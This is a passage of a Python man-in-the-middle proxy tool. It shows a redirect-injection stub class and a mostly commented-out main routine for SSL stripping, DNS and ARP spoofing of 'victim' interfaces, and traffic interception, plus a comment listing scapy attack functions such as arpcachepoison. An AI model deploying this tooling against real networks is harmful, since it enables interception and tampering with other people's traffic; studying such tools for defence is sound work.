    #developer_log("Made it into SocketServer.finish!\n")

    self.wfile.close()
    self.rfile.close()





class InjectRedirect:
  """This class is just here to allow us to track the state of a global variable that we'll soon be turning into real application logic."""

  def __init__(self):
    self.inject_redirect_stub = 0

  def inject_redirect(self,hostname):
    # This is really a stub routine right now, which will contain logic to decide whether to
    # inject a redirect on the next request by this user to this host.

    # For now, let's just check a class variable

    return self.inject_redirect_stub

  def set_inject_redirect(self,value):
    # This is really a stub routine right now, which will contain logic to decide whether to
    # inject a redirect on the next request by this user to this host.

    # For now, let's just set the class variable
    self.inject_redirect_stub = value



######################################
#### Main non-class Code starts here.
######################################


#### First, parse out command-line options

###if __name__ == '__main__':


  #################################
  #### Parse command-line options #
  #################################

  ###(options,args)=parseCommandLineFlags()

  ###hostname = options.ip
  ###port = int(options.port)

  #### Will we be removing SSL from the response?
  ###remove_ssl_from_response = 0
  ###if options.sslstrip:
    ###remove_ssl_from_response = 1

  #### Will we be injecting redirects?
  ###IR = InjectRedirect()
  #### Location we'd like to inject, with 301 (permanent) or 307 (temporary)
  ###location_to_inject = ""
  ###if options.url != "":
    ###location_to_inject = options.url
    ###IR.set_inject_redirect(1)
    ###if not re.match(r"^http",location_to_inject):
      ###print "website_to_redirect_users_to must start with http:// or https://\n"
      ###sys.exit(1)



  ######################
  #### Signal handling #
  ######################

  #### Define a signal handler so we can make sure we close the log files.
  ###def handle_signal_term(signum,frame):


    #### Kill off any children we've left around, generally from ARP spoofing.
    ###for pid in child_pids_to_shutdown:
      ###kill(pid,9)

    #### TODO-High: cleanly deactivate ARP spoofing

    #### Deactivate any ARP spoofing
    #### deactivate_arpspoof()


    #### Turn off the firewalling/routing
    ####stopRedirection()

    #### Close up the log files.
    ####debug_log("Closing log files.\n")
    ###stop_logging()
    ###exit(0)


  #### Catch normal kill command
  ###signal.signal(signal.SIGTERM, handle_signal_term)
  #### Catch Ctrl-C
  ###signal.signal(signal.SIGINT, handle_signal_term)

  #### Initialize Logging - open files for writing and create thread locks.
  ###initialize_logging()

  #### Start up the firewalling and routing to  send traffic to us.
  # startRedirection()

  #### Activate the DNS spoofing?
  ####os.spawnl(os.P_NOWAIT,r"/Users/jay/BFF_DNS.pl","")

  ####
  #### Activate the ARP spoofing.
  ####

  ####
  #### The middle_the_net module contains functions to target and MitM the LAN
  ####
  #### First, define what interfaces we need to ARPspoof.
  ####
  ###if toggle_arpspoof:
    #### TODO: Come back and get the interface list from command line and GUI
    ###victim_interface_list = [ "en0", "en1"]

    #### Now, launch a thread/process to ARPspoof the network.
    #### We wrote this as a thread, but we might write it as a process later.
    #### Doing the latter requires working with shared memory and command channels.
    ###arpspoof(victim_interface_list)

  #### Start up the multi-threaded proxy
  ####debug_log("Activating proxy\n")
  ###server = MiddlerThreadTCPServer((hostname,port), MiddlerHTTPProxy)

  ###server.serve_forever()

  #### We shouldn't ever reach this line, since the signal handler should do this.
  ###stop_logging()

####  Commands in scapy we can use:
####user_commands = [ sr, sr1, srp, srp1, srloop, srploop, sniff, p0f, arpcachepoison, send, sendp, traceroute, arping, ls, lsc, queso, nmap_fp, report_ports, dyndns_add, dyndns_del, is_promisc, promiscping ]
